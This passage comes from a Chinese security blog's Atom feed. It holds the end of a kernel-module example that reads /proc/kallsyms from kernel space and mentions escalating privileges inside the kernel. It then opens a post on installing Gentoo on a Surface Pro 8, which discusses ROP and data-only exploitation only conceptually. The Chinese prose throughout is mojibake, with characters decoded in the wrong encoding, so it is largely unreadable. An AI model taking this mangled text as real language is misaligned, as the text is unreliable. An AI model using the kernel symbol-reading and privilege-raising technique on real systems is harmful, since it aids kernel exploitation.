class="hljs-keyword">if</span> (!ubuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate userspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_ret;<br>    &#125;<br><br>    filp = filp_open(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IS_ERR(filp)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to open file! Error code: %ld\n&quot;</span>,<br>               PTR_ERR(filp));<br>        ret = PTR_ERR(filp);<br>        <span class="hljs-keyword">goto</span> out_free_ubuf;<br>    &#125;<br><br>    kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!kbuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate kernelspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(kbuf, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    fpos = <span class="hljs-number">0</span>;<br>    read_len = filp-&gt;f_op-&gt;read(filp, ubuf, PAGE_SIZE, &amp;fpos);<br>    filp-&gt;f_pos = fpos;<br>    <span class="hljs-keyword">if</span> (read_len &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to read file! Error code: %ld\n&quot;</span>,<br>              read_len);<br>        ret = read_len;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(kbuf, ubuf, read_len)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to copy data to kernel!\n&quot;</span>);<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Got data: %s\n&quot;</span>, kbuf);<br><br>out_close_file:<br>    filp_close(filp, <span class="hljs-literal">NULL</span>);<br>out_free_ubuf:<br>    vm_munmap((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ubuf, PAGE_SIZE);<br>out_ret:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>æˆåŠŸè¯»å– <code>/proc/kallsyms</code> æ–‡ä»¶ï¼š</p><p><img src="https://s2.loli.net/2024/06/03/juGzqY8l1DJUeiK.png"></p><blockquote><p>æ³¨æ„åˆ°è¿™é‡Œæˆ‘ä»¬è¯»å–çš„æ•°æ®ä¼¼ä¹ä¸å¤ªå¯¹ï¼Ÿè¿™å®é™…ä¸Šæ˜¯å› ä¸ºæƒé™ä¸è¶³çš„ç¼˜æ•…ï¼ˆåœ¨ sudo insmod ä¸‹æˆ‘ä»¬çš„ä¸»ä½“å‡­è¯è™½ç„¶æå‡åˆ°äº† rootï¼Œä½†æ˜¯ä¸æ–‡ä»¶æƒé™ç›¸å…³çš„å®¢ä½“å‡­è¯ä¸ä¸ sudo ç›¸å…³è”ï¼Œå› æ­¤åœ¨æ‰“å¼€æ–‡ä»¶ä¹‹å‰æˆ‘ä»¬éœ€è¦ <strong>åœ¨å†…æ ¸ä¸­æ‰‹åŠ¨è¿›è¡Œææƒ</strong> ï¼Œå®Œæˆè¯»å–åå†é™å›åŸæƒé™ï¼ˆå¯é€‰ï¼‰</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;çœŸæ˜¯åºåºåˆåˆ—åˆ—å•Šï¼Œä½ ä»¬æœ‰æ²¡æœ‰è¿™æ ·çš„æ–‡ä»¶æ¥å£å•Šæˆ‘æƒ³é—®&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="æ–‡ä»¶ç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="åºåˆ—æ–‡ä»¶æ¥å£" scheme="https://arttnba3.github.io/tags/%E5%BA%8F%E5%88%97%E6%96%87%E4%BB%B6%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>ã€DISTRO.0x02ã€‘åœ¨ Surface Pro 8 ä¸Šå®‰è£… Gentoo</title>
    <link href="https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/"/>
    <id>https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/</id>
    <published>2024-04-29T19:23:41.000Z</published>
    <updated>2025-07-05T21:06:33.034Z</updated>
    
    <content type="html"><![CDATA[<p>Gentoo å’Œ openSUSE Tumbleweed ç›¸æ¯”ï¼Œé‚£æˆ‘è¿˜æ˜¯è§‰å¾—æˆ‘ä»¬ Gentoo ç‰›æ‰¹</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>ç†Ÿæ‚‰çš„åºŸè¯ç¯èŠ‚ï¼Œå¯ä»¥ç›´æ¥è·³è¿‡ä¸çœ‹ï¼šï¼‰</p></blockquote><p>ç†Ÿæ‚‰ç¬”è€…çš„æœ‹å‹éƒ½çŸ¥é“ç¬”è€…æ˜¯ä¸€ä¸ªå¾®è½¯æ­»å¿ ç²‰ï¼ˆ <del>è™½ç„¶è¿™ä½å¾®è½¯æ­»å¿ ç²‰ç°åœ¨å¹¶æ²¡æœ‰åœ¨å°†ç”±å¾®è½¯å¼€å‘çš„æ“ä½œç³»ç»Ÿä½œä¸ºä¸»åŠ›</del> ï¼‰ï¼Œå› æ­¤æ‰‹ä¸Šè‡ªç„¶è€Œç„¶ä¼šæœ‰ä¸€äº› Surface è®¾å¤‡ï¼ˆå½“ç„¶ç»å¤§éƒ¨åˆ†éƒ½å‡ºäºŒæ‰‹å›è¡€äº†ï¼ŒğŸ‘´åªèƒ½è¯´å­¦ç”Ÿæ—¶ä»£ç¼ºé’±çš„ç©· b æ˜¯è¿™æ ·çš„ï¼‰ï¼Œæ°å¥½ç¬”è€…æ‰‹è¾¹æœ‰ä¸€å°é—²ç½®çš„ Surface Pro 8 è®¾å¤‡ï¼Œè€Œ Surface ä»è¿™ä¸€ä»£è®¾å¤‡å¼€å§‹æœ‰ä¸€ä¸ªæ”¯æŒæ–¹ä¾¿å¿«æ·åœ°è‡ªè¡Œæ›´æ¢ç¡¬ç›˜çš„è®¾è®¡ï¼ŒåŒæ—¶ç¬”è€…åŸæœ‰çš„è®¾å¤‡æ˜¯æœ€ä½é…çš„ç‰ˆæœ¬ ï¼ˆ8G è¿å­˜ + 128G å­˜å‚¨ï¼‰ï¼Œå› æ­¤ç¬”è€…å°±æƒ³æŠŠè¿™å°é™ªä¼´äº†ç¬”è€…å¤§å››æœŸé—´å¤šä¸ªå¤œæ™šçš„è®¾å¤‡ï¼ˆå› ä¸ºæ™šä¸Šå®¿èˆæ–­ç”µï¼Œæ‰€ä»¥æœ‰è¿™æ ·ä¸€å°ç»­èˆªé•¿çš„åŠå…¬æœ¬è¿˜æ˜¯å¾ˆé‡è¦çš„ï¼Œ <del>å½“ç„¶è¿™é‡Œè‚¯å®šæœ‰äººè¦é—®ä¸ºä»€ä¹ˆä¸ç”¨ macbook äº†ï¼Œè™½ç„¶è¯´ mac çš„ç»­èˆªæ—¶é—´ç¡®å®æ¯” Windows é˜µè¥ä»»ä½•çš„ç¬”è®°æœ¬è¦é•¿å¾—å¤šï¼Œä½†æ˜¯ç¬”è€…å½“æ—¶å¹¶æ²¡æœ‰é’±èƒ½å¤Ÿä¹°å¾—èµ·å“ªæ€•æ˜¯ä¸€å°äºŒæ‰‹çš„ macbookï¼Œè€Œä¸”æ—¢ç„¶éƒ½ä¹° macbook äº†å†ä¹°äºŒæ‰‹æœªå…æœ‰äº›å¯’ç¢œï¼Œå¯èƒ½æœ‰äººåˆä¼šæŠ¬æ è¯´ Surface éƒ½ä¹°äº†æ€ä¹ˆä¹°ä¸èµ· macbookï¼Œæ¯•ç«Ÿæœ€ä½é…çš„ Surface ä»·æ ¼ç»ˆç©¶æ˜¯æ¯”æœ€ä½é…çš„ macbook è¦ä¾¿å®œä¸å°‘ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„åŸå› ä¾¿æ˜¯ç¬”è€…æ­¤å‰å¾ˆå¤šå·¥ä½œè¿˜æ˜¯éœ€è¦åœ¨ X86 å¹³å°ä¸Šå®Œæˆï¼Œmac ä¸‹è™½ç„¶æœ‰ Rosetta æˆ–æ˜¯ Parallelï¼Œä½†æ˜¯è½¬è¯‘ç»ˆç©¶è¿˜æ˜¯ä¼šå¸¦æ¥ä¸€å®šçš„æ€§èƒ½æŸè€—ï¼Œè€Œä¸”ä½¿ç”¨èµ·æ¥å¹¶ä¸ä¼˜é›…ï¼Œé‚£è¿™é‡Œå¯èƒ½åˆä¼šæœ‰äººé—®ä¸ºä»€ä¹ˆä¸ä¹°è”æƒ³æˆ–æ˜¯å…¶ä»–ç‰Œå­çš„åŒä»·ä½åŠå…¬æœ¬ï¼Œé‚£ğŸ‘´åªèƒ½è¯´ç”°ç‰Œå°±æ˜¯ä¿¡ä»°</del> ï¼‰ç»™ç®€å•å‡çº§ä¸€ä¸‹ï¼Œåœ¨æ›¿æ¢å¤§å®¹é‡ç¡¬ç›˜çš„åŒæ—¶é¡ºä¾¿è£…ä¸€ä¸ª Windows + Linux åŒç³»ç»Ÿï¼Œ<strong>å‰è€…æ˜¯ä¸ºäº†ä¿ç•™åŸæ±åŸå‘³çš„ Surface ä½“éªŒï¼Œåè€…åˆ™æ˜¯çº¯ç²¹ä¸ºäº†çæŠ˜è…¾</strong>ï¼šï¼‰</p><p>å‡ºäºå„ç§å› ç´ çš„è€ƒè™‘ï¼ˆ <del>å¯èƒ½æ˜¯å·å·¥å‡æ–™</del> ï¼‰å¾®è½¯ä¸º Surface Pro é€‰ç”¨äº† 2230 è§„æ ¼çš„ SSDï¼Œè¿™ä¸ªè§„æ ¼çš„ SSD å¹¶ä¸å¥½æ‰¾ï¼Œå°¤å…¶æ˜¯ç¬”è€…ç›®å‰è‚‰èº«ä½äºåœ°å¤§ç‰©ç©·çš„ä½äºå¤§æ´‹å½¼å²¸ç¦»æ‰€æœ‰å›½å®¶éƒ½å¾ˆè¿œçš„æ¾³æ´²ï¼Œæ‰¾äº†åŠå¤©<a href="https://cplonline.com.au/micron-mtfdkbk2t0qfm-1bd1aabyyr-2400-2tb-m-2-2230-nvme-ssd.html">æ‰åœ¨ CPL ä¸Šæ‰¾åˆ°ä¸€æ¬¾é•å…‰çš„ 2230 è§„æ ¼çš„ 2TB SSD</a>ï¼Œè™½ç„¶å•†å“é¡µé¢å†™ç€ <code>NOT Compatible with Surface Pro 8/9</code> ï¼Œä½†æ˜¯<strong>åœ¨ç¬”è€…çœ‹æ¥ç†è®ºä¸Šæ¥è¯´ä¸å…¼å®¹çš„æƒ…å†µä¸å¤ªå¯èƒ½å‘ç”Ÿ</strong>ï¼ŒåŒæ—¶ç¬”è€…åœ¨å¾®è½¯ç¤¾åŒºä¸Šæ‰¾åˆ°äº† <a href="https://answers.microsoft.com/en-us/surface/forum/all/what-is-the-max-ssd-my-surface-pro8-will-accept/4cf1ff6d-0bb8-415a-a4b9-690e31808f34">ä¸€ç¯‡æˆåŠŸåœ¨ Surface Pro 8 ä¸Šå®‰è£…è¿™ä¸€æ¬¾ SSD çš„å¸–å­</a>ï¼Œé‚£â€œä¸å…¼å®¹â€ä¸€è¯´æƒ³æ¥åº”å½“æ˜¯æ— ç¨½ä¹‹è°ˆï¼ˆåˆæˆ–è€…æ˜¯å¾®è½¯çš„å•†ä¸šæ‰‹æ®µï¼Œå› ä¸ºè¿™æ ·ä½ å°±ä¸ä¼šå»ä¹°ä¾¿å®œç¡¬ç›˜äº†ï¼Œè€Œä¼šå±ˆæœäºå¾®è½¯å®˜æ–¹å•†åŸè´µå¾—è¦æ­»æ€§ä»·æ¯”æä½çš„å®˜æ–¹è´´ç‰Œç¡¬ç›˜ï¼Œ<strong>è€Œäº‹å®è¯æ˜ Micron çš„è¿™å— SSD ç¡®å®æ˜¯å¯ä»¥å…¼å®¹çš„</strong>ï¼‰ï¼Œå› æ­¤ç¬”è€…é€‰äº†ä¸€ä¸ªé£å’Œæ—¥ä¸½ <del>ä½†å…¶å®ä¸‹ç€ç»†é›¨</del> çš„æ—¥å­å‰å¾€å¢¨å°”æœ¬çš„æŸå®¶ CPL çº¿ä¸‹é—¨åº—å–åˆ°äº†è¿™æ¬¾ SSD ï¼ˆ <del>æ˜¯çš„è¿™å°±æ˜¯å‘è¾¾å›½å®¶æ¯”è¾ƒå¸¸è§çš„è´­ç‰©æ–¹å¼ï¼Œæ²¡æœ‰å›½å†…é‚£æ ·å‘è¾¾çš„ç‰©æµç½‘ç»œè¯´å®è¯ğŸ‘´æ„Ÿè§‰ä¹°å•¥éƒ½ä¸æ–¹ä¾¿ï¼Œå½“ç„¶å‡ºæ¥æ´»åŠ¨æ´»åŠ¨ç­‹éª¨ä¹Ÿæ˜¯å¥½çš„ï¼Œä¸è¿‡æ›´ä¸»è¦çš„è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯é…é€è´¹å¤ªè´µäº†</del> ï¼‰</p><p><img src="https://s2.loli.net/2024/04/27/q3giJxNV9ZpvrIS.png" alt="ä»·æ ¼æ¯”å›½å†…è´µä¸Šå¥½å‡ ç™¾ RMBï¼Œæ¾³æ´²çš„å¤§éƒ¨åˆ†ç”µå­äº§å“éƒ½æ˜¯å¦‚æ­¤"></p><p>æ¥ä¸‹æ¥æ˜¯å¯¹ç³»ç»Ÿå‘è¡Œç‰ˆçš„é€‰æ‹©ï¼ŒWindows è‡ªç„¶ä¸ç”¨è¯´ç›´æ¥è£…æœ€æ–°çš„ Win 11ï¼Œé‚£ä¹ˆ Linux è¯¥é€‰æ‹©å“ªä¸€ç§å‘è¡Œç‰ˆå‘¢ï¼Ÿé¦–å…ˆè€ƒè™‘æ¯”è¾ƒè´´è¿‘ä¸Šæ¸¸çš„ Linux å‘è¡Œç‰ˆâ€”â€”</p><ul><li>å‡ºäºçæŠ˜è…¾çš„è§’åº¦è€ƒè™‘ <code>Arch Linux</code> è‡ªç„¶æ˜¯æä¾›äº†ä¸€å®šçš„æŠ˜è…¾ç©ºé—´ä»¥åŠ AUR çš„æµ·é‡è½¯ä»¶åŒ…ï¼Œåœ¨ä¸ºç³»ç»Ÿå¸¦æ¥æé«˜çš„å¯å®šåˆ¶æ€§çš„åŒæ—¶ä½ å‡ ä¹å¯ä»¥åœ¨ AUR ä¸Šæ‰¾åˆ°ä»»ä½•è½¯ä»¶</li><li><code>Fedora Workstation</code> ä½œä¸º RHEL çš„è¯•éªŒç”°åŒæ—¶ä¹Ÿæ˜¯ Linus æ‰€ç”¨çš„å‘è¡Œç‰ˆåœ¨ç´§è´´ä¸Šæ¸¸çš„åŒæ—¶æä¾›äº†ä¸å¼±äº Arch çš„å…ˆè¿›æ€§ï¼Œæœ‰ç€æ¥è‡ªçº¢å¸½çš„å¼ºå¤§æŠ€æœ¯æ”¯æŒï¼Œè½¯ä»¶æ›´æ–°æ¯”ä¸€éƒ¨åˆ†æ»šåŠ¨å‘è¡Œç‰ˆè¿˜è¦æ¿€è¿›ï¼Œ  <del>æ›´æ˜¯èƒ½ç¬¬ä¸€æ—¶é—´å½“ RedHat çš„å°ç™½é¼ </del></li><li><code>openSUSE Tumbleweed</code> åˆ™æœ‰ç€ SUSE é‚£æ¥è‡ªå¾·å›½äººçš„ç²¾ç¡®ä¸ä¸¥è°¨ï¼Œåœ¨å…¼é¡¾ç¨³å®šæ€§çš„åŒæ—¶ä¿æŒäº†æ»šåŠ¨æ›´æ–°ç´§è´´ä¸Šæ¸¸ï¼ˆæ›´æœ‰ç€ Slowroll è¿™æ ·ç­‰ç€ Tumbleweed æ»šç¨³äº†å†æ›´æ–°çš„â€œæ…¢æ»šâ€å‘è¡Œç‰ˆï¼‰ï¼ŒYaST æ›´åƒä¸€ä¸ªæ¸©æŸ”çš„å¤§å§å§ä¸€æ ·èƒ½å¸®ä½ è½»æ¾è§£å†³ç›¸å½“å¤šçš„å„ç±»éœ€æ±‚ï¼Œ <em>å› æ­¤è¿™ä¹Ÿæ˜¯ç¬”è€…çš„ä¸»åŠ›ç¬”è®°æœ¬æ‰€ä½¿ç”¨çš„ Linux å‘è¡Œç‰ˆ</em></li></ul><p><img src="https://s2.loli.net/2024/04/30/62x7yCpgKwqOYHj.png" alt="ç†Ÿæ‚‰ç¬”è€…çš„éƒ½çŸ¥é“ç¬”è€…ä¸€ç›´éƒ½æ˜¯ SUSE æ‰¹.jpg"></p><p>è™½ç„¶è¿™äº›éƒ½æ˜¯ç¬”è€…æ¯”è¾ƒå–œæ¬¢çš„å‘è¡Œç‰ˆï¼Œä½†æ€æ¥æƒ³å»ç¬”è€…è¿˜æ˜¯å†³å®šå®‰è£…ä¸€ä¸ªä¸å¤ªå¸¸è§„çš„ Linux å‘è¡Œç‰ˆâ€”â€” <a href="https://gentoo.org/">Gentoo Linux</a> ï¼Œæœ€ç›´æ¥çš„åŸå› å°±æ˜¯<strong>è¿™æ˜¯ä¸€ä¸ªå°‘æœ‰çš„åŸç”Ÿä»æºç å®‰è£…è½¯ä»¶åŒ…çš„æ»šåŠ¨ Linux å‘è¡Œç‰ˆ</strong> ï¼Œä»»ä½•è½¯ä»¶éƒ½éœ€è¦è‡ªè¡Œåœ¨è‡ªå·±çš„æœºå™¨ä¸Šè¿›è¡Œç¼–è¯‘ï¼Œ<strong>è¿™æ„å‘³ç€æ‰€æœ‰äººçš„è½¯ä»¶çš„äºŒè¿›åˆ¶åŒ…éƒ½æ˜¯ä¸ä¸€æ ·çš„</strong>ï¼Œè™½ç„¶è¯´è¿™ä¸ç›®å‰è½¯å·¥ä¸šç•Œæ‰€è¿½æ±‚çš„<a href="https://en.wikipedia.org/wiki/Reproducible_builds">â€œé€ä½å¯é‡å¤æ„å»ºâ€</a> ä¼¼ä¹å®Œå…¨èƒŒé“è€Œé©°ï¼Œä½†ä»è½¯ä»¶å®‰å…¨çš„è§’åº¦è€ƒè™‘è¿™æ„å‘³ç€ <em>å“ªæ€•ä½ çŸ¥é“æˆ‘çš„ç”µè„‘ä¸Šçš„æŸä¸ªè½¯ä»¶ä¸­å­˜åœ¨äºŒè¿›åˆ¶æ¼æ´ï¼Œä½ ä¹Ÿæ— æ³•ç›´æ¥é€šè¿‡ä¼ ç»Ÿçš„å¸¸è§„ pwn æ‰‹æ³•è¿›è¡Œæ”»å‡»</em>  ï¼Œè¿™ä¸»è¦æ˜¯å‡ºäºä¸€ä¸ªåŸå› ï¼š <strong>ç°æœ‰çš„æ¼æ´åˆ©ç”¨æ–¹æ³•é€šå¸¸æ˜¯æ§åˆ¶æµåŠ«æŒå¯¼å‘çš„ï¼Œé’ˆå¯¹è½¯ä»¶äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„æ–¹å¼é€šå¸¸æ˜¯åŠ«æŒæ§åˆ¶æµåå†åˆ©ç”¨è½¯ä»¶ä¸­åŸæœ‰çš„ä»£ç ç‰‡æ®µæ„å»ºæ‰§è¡Œé“¾å®Œæˆä»»æ„ä»£ç æ‰§è¡Œ</strong> ï¼Œä¾‹å¦‚ç°åœ¨é’ˆå¯¹ä¸åŒç¨‹åºçš„ä¸åŒç‰ˆæœ¬ä¸­å­˜åœ¨çš„æŸä¸€æ¼æ´è¿›è¡Œæ”»å‡»çš„åŠæ³•é€šå¸¸æ˜¯è¾¨åˆ«ç›®æ ‡è½¯ä»¶ç‰ˆæœ¬ååˆ©ç”¨ ROPgadget æˆ–æ˜¯å…¶ä»–çš„ä¸€äº›å·¥å…·æ¥æ‹¼å‡‘ ROP chain ï¼Œè€Œè¿™æ ·çš„æ”»å‡»æ–¹æ³•çš„å¯è¡Œæ€§å¾—ä»¥æˆç«‹çš„åŸå› åˆ™æ˜¯åŒ…æ‹¬å†…æ ¸åœ¨å†…çš„è½¯ä»¶äºŒè¿›åˆ¶é€šå¸¸æ˜¯ç”±è½¯ä»¶æºä¾§å®Œæˆç¼–è¯‘åå†åˆ†å‘ç»™ç”¨æˆ·ï¼Œè¿™æ„å‘³ç€åœ¨åŒä¸€å‘è¡Œç‰ˆä¸Šä½¿ç”¨åŒä¸€ç‰ˆæœ¬è½¯ä»¶çš„ç”¨æˆ·æ‰€æŒæœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯¹äºæ”»å‡»è€…è€Œè¨€è·å–ç›¸åº”è½¯ä»¶çš„äºŒè¿›åˆ¶æ–‡ä»¶åŸºæœ¬ä¸Šæ˜¯æ²¡ä»€ä¹ˆéš¾åº¦çš„ï¼Œ <strong>è€Œæ‰€æœ‰è½¯ä»¶éƒ½è‡ªè¡Œç¼–è¯‘åˆ™å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸ŠåŠ å¤§æ”»å‡»è€…åœ¨ä¼ ç»Ÿæ”»å‡»é¢çš„æ”»å‡»éš¾åº¦</strong> â€”â€”è¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ»¡è¶³äº†ç¬”è€…çš„ç²¾ç¥æ´ç™–ï¼šï¼‰</p><blockquote><p>å½“ç„¶å¯èƒ½æœ‰äººä¼šæŠ¬æ è¯´è¿™æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œæ¯•ç«Ÿç°åœ¨ <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">exploit technique å‰æ²¿éƒ½åœ¨å„ç§ data-only attack</a> ï¼Œä»…æ˜¯é˜»æŒ¡æ”»å‡»è€…è·å– code gadget çš„æ–¹å¼æ˜¯æ— æ³•å®Œæˆ 100% çš„é˜²æŠ¤çš„ï¼Œ å¯èƒ½ä¹Ÿæœ‰äººä¼šæŠ¬æ è¯´ <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/catc17-introduction-intel-cet-844137.pdf">æŠŠ CET å¼€ä¸Šä¸å°±å®Œäº‹äº†</a> ï¼Œ <strong>ä½†å¯¹ç¬”è€…è€Œè¨€èƒ½æœ‰ä¸€å®šç¨‹åº¦çš„æå‡é‚£å°±æ˜¯æœ‰æ„ä¹‰çš„ï¼Œåœ¨ç¬”è€…çœ‹æ¥è¿™å¹¶éä»…æœ‰ 0 å’Œ 100 çš„åŒºåˆ«</strong> ï¼ŒåŒæ—¶å¯¹äºæ”»å‡»è€…è€Œè¨€é’ˆå¯¹æ‰€æœ‰è½¯ä»¶éƒ½å•ç‹¬å¼€å‘ data-only çš„æ”»å‡»æ‰‹æ³•æœªå…æˆæœ¬å°±å¤ªé«˜äº†ï¼Œç›®å‰çš„è¿™ç±»ç ”ç©¶è¿˜ä»…é›†ä¸­åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–æ˜¯å…¶ä»–å¤§å‹è½¯ä»¶ä¸Š</p><p>æ­¤å¤–ï¼Œå½¢å¦‚ <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">CFI</a> è¿™æ ·çš„é˜²å¾¡æ‰‹æ³•åœ¨å‘è¡Œç‰ˆåˆ†å‘çš„äºŒè¿›åˆ¶è½¯ä»¶åŒ…ä¸­å¾ˆå¤šéƒ½æ˜¯æœªå¿…å¼€å¯çš„ï¼Œè€Œ Gentoo è¿™æ ·è‡ªå®šä¹‰è½¯ä»¶ç¼–è¯‘é€‰é¡¹çš„å‘è¡Œç‰ˆå¯ä»¥è®©ä½ å¿«é€Ÿåœ¨ç³»ç»Ÿå„ä¸ªè½¯ä»¶ä¸­åº”ç”¨è¿™äº›é˜²æŠ¤æ‰‹æ®µï¼ŒåŒæ—¶å®šåˆ¶è‡ªå·±æ‰€æƒ³è¦çš„ä¼˜åŒ–é€‰é¡¹ï¼Œå¯èƒ½ä¸æ˜¯æœ€å¥½çš„ï¼Œä½†æ˜¯<strong>ä»ç²¾ç¥å±‚é¢è€Œè¨€ä¸€å®šæ˜¯æœ€é€‚åˆè‡ªå·±çš„</strong></p><p> é‚£åˆæœ‰äººå¯èƒ½ä¼šè¯´æ¯ä¸ªå¼€æºè½¯ä»¶éƒ½è‡ªå·±æ‰‹å·¥æ‹‰æºç ç¼–è¯‘ä¸å°±å¥½äº†å¹²å˜›ä¸€å®šè¦ç”¨ Gentooï¼Œç¬”è€…çš„è¯„ä»·æ˜¯ï¼š</p><p><img src="https://s2.loli.net/2024/05/09/EfglUGYtAqpTSmz.png" alt="ç”·äººï¼Œä»€ä¹ˆç½å¤´æˆ‘è¯´ï¼Œæ›¼å·´å‡ºå»"> </p></blockquote><p>å½“ç„¶ï¼Œé™¤äº†<strong>å¯ä»¥åŸºäºè‡ªèº«éœ€æ±‚é«˜åº¦å®šåˆ¶</strong>è¿™ä¸ªæ ¸å¿ƒåŠ¨æœºä»¥å¤–ï¼ŒGentoo æœ‰ç€ä¸€ä¸ªå¼ºå¤§çš„åŒ…ç®¡ç†å™¨ï¼š<a href="https://wiki.gentoo.org/wiki/Portage">Portage</a> ï¼Œé€šè¿‡é…ç½® <code>USE flag</code> å¯ä»¥æŒ‰ç…§éœ€æ±‚å»ç¼–è¯‘è½¯ä»¶åŒ…ï¼Œå®ç° <strong>å¦‚æ— å¿…è¦ï¼Œå‹¿å¢å®ä½“</strong> çš„å“²å­¦ï¼ˆä¾‹å¦‚ä½ éœ€è¦ä½¿ç”¨çš„éƒ¨åˆ†è½¯ä»¶å¸¦æœ‰ kde æ”¯æŒï¼Œä½†ä½ å…¶å®å¹¶ä¸ä½¿ç”¨ kdeï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨ <code>/etc/portage/make.conf</code> ä¸­æ·»åŠ  <code>USE=&quot;-kde&quot;</code>  è¿™ä¸€ flagï¼Œè¿™æ˜¯ä¸€ä¸ªå…¨å±€æ€§çš„ä¾‹å­ï¼›åˆæˆ–è€…å¯¹äºæŸäº›è½¯ä»¶åŒ…ä½ æƒ³è¦å¯ç”¨&#x2F;ç¦æ­¢æŸäº›æ”¯æŒè€Œå¹¶ä¸æƒ³è¦æŠŠè¿™æ ·çš„é…ç½®å…¨å±€åŒ–ï¼Œä½ åªéœ€è¦åœ¨ <code>/etc/portage/package.use</code> ç›®å½•ä¸‹åˆ›å»ºæ–°é…ç½®æ–‡ä»¶æ¥ä¸ºæŒ‡å®šç¨‹åºå£°æ˜ USE æ ‡è®°ï¼Œä¾‹å¦‚ <code>kde-plasma/plasma-meta qt5 -sddm</code> å°†ä¸º KDE Plasma æ¡Œé¢ç¼–è¯‘ä¸Š QT æ”¯æŒçš„åŒæ—¶ä¸ä½¿ç”¨ SDDMï¼›å½“ç„¶ï¼Œ<a href="https://blog.xupeng.me/2006/10/10/met-problem-of-circular-dependencies-with-gentoo/">æ»¥ç”¨ USE flags æœ‰å¯èƒ½ä¼šæ¥å¸¦å¾ªç¯ä¾èµ–çš„é—®é¢˜</a>ï¼Œé‚£è¿™åˆæ˜¯å¦å¤–ä¸€ä»¶äº‹æƒ…äº†â€¦ï¼‰ï¼Œ <a href="https://wiki.gentoo.org/wiki/Selected-packages_set_(Portage)">world file</a> çš„å­˜åœ¨ä¹Ÿå¤§å¹…å¢æ·»äº†ç³»ç»Ÿçš„å¯é‡å¤æ„å»ºæ€§ï¼ˆç¡¬è¦è¯´çš„è¯åœ¨å¯å¤ç°æ€§ä¸Šè‚¯å®šæ¯”ä¸è¿‡ NixOSï¼Œä½†ç¬”è€…å¯¹äº NixOS è¿™ç±»â€œä¸å¯å˜ç³»ç»Ÿâ€çš„æ¦‚å¿µè¯´å®è¯ä¸å¤ªæ„Ÿå†’ï¼Œåå€’è§‰å¾—å¯¹äºæ¡Œé¢ç”¨æˆ·è€Œè¨€è¿™å¢æ·»äº†ä¸å°‘æ²¡å¿…è¦çš„éº»çƒ¦ï¼Œä¸è¿‡å¤šå­¦ä¹ ä¸€é—¨ DSL å€’å…¶å®æ˜¯æ— æ‰€è°“çš„äº‹æƒ…ï¼Œæ¯•ç«Ÿ reproducible çš„ä½“éªŒæŸç§ç¨‹åº¦ä¸ŠçœŸçš„å¾ˆé¦™ï¼Œä½† NixOS 